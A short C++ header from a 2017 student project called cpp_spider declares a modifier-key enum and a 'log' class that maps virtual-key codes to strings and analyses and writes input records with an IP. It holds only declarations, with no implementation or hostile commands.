//
// log.hpp for cpp_spider in /home/fortevg/rendu
//
// Made by Gabriel Forteville
// Login   <gabriel.forteville@epitech.eu>
//
// Started on  sam. oct. 7 16:14:6 2017 Gabriel Forteville
// Last update sam. oct. 7 16:14:6 2017 Gabriel Forteville
//

#ifndef _VK_CODES_HPP_
# define _VK_CODES_HPP_

# include <map>
# include <sstream>
# include <list>
# include <sql/Database.hpp>
# include <misc/t_input.h>

enum 	special
{
  MAJ = 1,
  ALT = 2,
  CTRL = 4,
  ALTGR = 8

};

class log
{
 private:

 public:
  log();
  ~log() = default;

  std::map<unsigned char, std::string> vkCodesMap;
/*  Database &db;
  */

  void analyse_data(std::list<s_input> &ldata, std::stringstream &fdata);
  void write_data(std::stringstream &fdata, const int &ip);
};

#endif /* !_VK_CODES_MAP_HPP_ */